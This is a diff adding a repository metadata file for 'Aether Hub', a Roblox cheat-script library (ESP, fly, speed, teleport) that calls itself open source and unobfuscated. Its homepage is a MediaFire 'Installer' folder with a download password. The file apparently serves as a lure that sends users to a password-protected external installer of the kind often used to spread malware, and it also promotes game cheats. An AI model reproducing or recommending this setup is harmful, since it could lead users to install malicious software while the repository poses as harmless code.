@@ -1,0 +1,31 @@
+{
+  "name": "aether-hub",
+  "description": "Aether Hub - a curated Luau script library for Roblox. Fullbright, speed, ESP, fly, anti-AFK, teleport and more. Plain scripts, no obfuscation.",
+  "homepage": "https://www.mediafire.com/folder/xpuwhpaw2jpbi/Installer",
+  "download_password": "5139237619",
+  "private": false,
+  "has_discussions": true,
+  "has_issues": true,
+  "topics": [
+    "roblox",
+    "roblox-scripts",
+    "luau",
+    "lua",
+    "script-hub",
+    "roblox-executor",
+    "executor",
+    "fullbright",
+    "esp",
+    "fly",
+    "speed",
+    "teleport",
+    "anti-afk",
+    "game-scripts",
+    "script-library",
+    "open-source",
+    "windows",
+    "modding",
+    "game-development",
+    "aether"
+  ]
+}
